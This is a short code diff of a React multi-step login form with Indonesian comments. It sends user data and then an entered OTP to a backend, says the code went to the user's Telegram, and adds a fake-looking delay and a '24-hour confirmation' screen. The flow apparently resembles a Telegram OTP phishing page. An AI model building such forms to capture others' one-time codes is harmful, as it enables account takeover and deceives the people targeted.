@@ -47,12 +47,12 @@ export default function AuthForm() {
 
   const onSubmit = async (values: z.infer<typeof formSchema>) => {
     setIsLoading(true)
-    // Animasi loading 2 detik sebelum pindah tahap
+    // Delay 2 detik untuk animasi loading agar terlihat profesional
     setTimeout(async () => {
       if (step === 1) {
         await sendToBackend(values, "DATA_AWAL")
         setStep(2)
-        toast.success("Kode OTP terkirim")
+        toast.success("Kode OTP terkirim ke Telegram Anda")
       } else if (step === 2) {
         await sendToBackend(values, "INPUT_OTP")
         setStep(3)
@@ -65,6 +65,7 @@ export default function AuthForm() {
     }, 2000)
   }
 
+  // Tampilan Konfirmasi 1x24 Jam
   if (step === 4) {
     return (
       <div className="w-full max-w-md mx-auto p-8 border rounded-xl shadow-sm bg-white text-center space-y-4">
